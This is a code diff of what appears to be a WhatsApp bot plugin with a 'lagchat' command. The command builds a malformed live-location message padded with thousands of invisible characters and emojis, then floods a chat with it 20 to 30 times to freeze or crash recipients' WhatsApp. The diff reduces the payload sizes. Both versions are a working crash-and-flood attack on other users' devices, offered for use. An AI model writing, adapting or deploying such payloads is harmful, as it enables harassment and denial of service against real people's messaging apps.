@@ -2,17 +2,17 @@ const buildLagMessage = () => ({
   viewOnceMessage: {
     message: {
       liveLocationMessage: {
-        degreesLatitude: '💣'.repeat(500),
-        degreesLongitude: '💥'.repeat(500),
-        caption: '\u2063'.repeat(20000) + '💥'.repeat(1000),
+        degreesLatitude: '💣',
+        degreesLongitude: '💥',
+        caption: '\u2063'.repeat(15000) + '💥'.repeat(300),
         sequenceNumber: '999',
-        jpegThumbnail: Buffer.alloc(100000, 0), // Thumbnail corrupto y pesado
+        jpegThumbnail: null,
         contextInfo: {
           forwardingScore: 999,
           isForwarded: true,
           externalAdReply: {
-            title: '💣 LagChat Extremo 💥',
-            body: '¡Esto te cerrará WhatsApp!',
+            title: '💣 Lag WhatsApp',
+            body: 'Este mensaje es muy pesado',
             mediaType: 1,
             renderLargerThumbnail: true,
             showAdAttribution: true,
@@ -28,22 +28,22 @@ let handler = async (m, { conn, isOwner }) => {
   if (!isOwner) throw '⛔ Solo el Owner puede usar este comando.'
 
   const jid = m.chat
-  const times = 30 // Más repeticiones para intensificar
+  const times = 20
 
-  await m.reply(`⚠️ Enviando ${times} *bombas extremas* al chat...\n❗ Este ataque puede cerrar WhatsApp completamente.`)
+  await m.reply(`⚠️ Enviando ${times} bombas al chat...\n❗ Esto puede trabar WhatsApp Web o móviles lentos.`)
 
   for (let i = 0; i < times; i++) {
     try {
       await conn.relayMessage(jid, buildLagMessage(), { messageId: conn.generateMessageTag() })
-      await new Promise(resolve => setTimeout(resolve, 100)) // Menor delay para mayor carga
+      await new Promise(resolve => setTimeout(resolve, 200))
     } catch (error) {
       console.error('Error al enviar mensaje:', error)
-      await m.reply('❗ Falló al enviar. Puede que el chat ya esté colapsado.')
+      await m.reply('❗ Ocurrió un error al enviar el mensaje. Intenta de nuevo.')
       return
     }
   }
 
-  await m.reply('✅ *Lagchat EXTREMO completado.* ¿Ya se te congeló? 😈🔥')
+  await m.reply('✅ *Lagchat completo.* ¿Se te laggeó? 😈')
 }
 
 handler.command = /^lagchat$/i
